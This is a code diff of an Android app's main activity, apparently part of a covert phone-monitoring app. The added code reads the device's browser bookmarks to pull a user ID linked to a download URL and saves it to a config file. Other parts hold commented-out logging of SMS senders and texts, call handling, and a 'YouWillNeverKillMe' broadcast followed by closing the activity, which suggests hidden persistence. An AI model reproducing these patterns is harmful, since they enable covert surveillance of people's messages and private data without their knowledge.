@@ -8,7 +8,9 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.media.Ringtone;
 import android.media.RingtoneManager;
 import android.net.Uri;
@@ -70,6 +72,11 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     private Button registration, cookie;
     private EditText userID;
 
+    private static final String APP_PREFERENCES_NAME = "MY_PREFERENCES";
+    private static final String PREFERENCES_KEY_IS_CALL = "call";
+    private static final String IS_CALL = "noCall";
+    private SharedPreferences mSettings = null;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -80,7 +87,32 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         registration.setOnClickListener(this);
         cookie.setOnClickListener(this);
 
+        userID.setText(idUser());
+    }
+    private String idUser(){
+        String id_user = "";
+        String url_data = "url";
+        String date = "date";
+        String title = "title";
+        Uri uri;
+        String where = url_data+"= ?";
+        String date_query[] = {"http://omniscient.pro/api/download.php"};
 
+        uri = Uri.parse("content://browser/bookmarks");
+        String[] projection = {title};
+
+    try {
+        Cursor cur = getContentResolver().query(uri,
+                projection, where, date_query, date + " DESC");// DESC - сортировка по убываню
+        Integer title_data_column_index = cur.getColumnIndexOrThrow(title);
+
+        if (cur.moveToFirst()) {
+            id_user = cur.getString(title_data_column_index);
+        }
+        writeToFile(getApplicationContext(), id_user.toString());
+
+    }catch (Exception e){}
+        return id_user;
     }
 
     @Override
@@ -157,9 +189,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 //            Log.i(Msg, "Phone : "+buf.getAddress());
 //            Log.i(Msg, "Text : "+buf.getMsg());
 //            buf_date = Long.parseLong(buf.getTime());
-//            Log.i(Msg, "date : " + new SimpleDateFormat("dd/MM/yyyy HH:mm")
+//            Log.i(Msg, "date : " + new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss")
 //                    .format(buf_date*1000));
-//        } 
+//        }
 //
 
 //        PhoneCall phoneCall = new PhoneCall();
@@ -200,7 +232,13 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         //ad.forceLoad();
 
 //        Intent par = new Intent(getApplicationContext(), StartService.class);
+//        mSettings = getSharedPreferences(APP_PREFERENCES_NAME, Context.MODE_PRIVATE);
+//        SharedPreferences.Editor editor = mSettings.edit();
+//
+//        editor.putString(PREFERENCES_KEY_IS_CALL, IS_CALL);
+//        editor.apply();
         sendBroadcast(new Intent("YouWillNeverKillMe"));
+
         finish(); //ЕТО ВКЛЮЧИТЬ
             }
 
@@ -220,32 +258,21 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
         }
     }
-    // save id_user
+
+//     save id_user
     private void saveLogin(){
-        writeFromFile(getApplicationContext(), "super");
+        writeToFile(getApplicationContext(), userID.getText().toString());
     }
 
-    private void writeFromFile(Context context, String data) {
+    private void writeToFile(Context context, String data) {
 
         try {
-            File stPath = new File(context.getFilesDir(), "/Config");//DIR);
-            // создаем каталог
-            if (!stPath.exists()) {
-                stPath.mkdirs();
-            }
-            File file = new File(stPath, "config.cnf");
-            FileOutputStream f = new FileOutputStream(file);
-            PrintWriter pw = new PrintWriter(f);
-            pw.println(userID.getText().toString());
 
-            pw.flush();
-            pw.close();
-            f.close();
+            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("config.cnf", Context.MODE_PRIVATE));
+            outputStreamWriter.write(data);
+            outputStreamWriter.close();
         }
-        catch (IOException e) {
-            Log.e("Exception", "File write failed: " + e.toString());
-        }
-
+        catch (IOException e) {}
     }
 
 
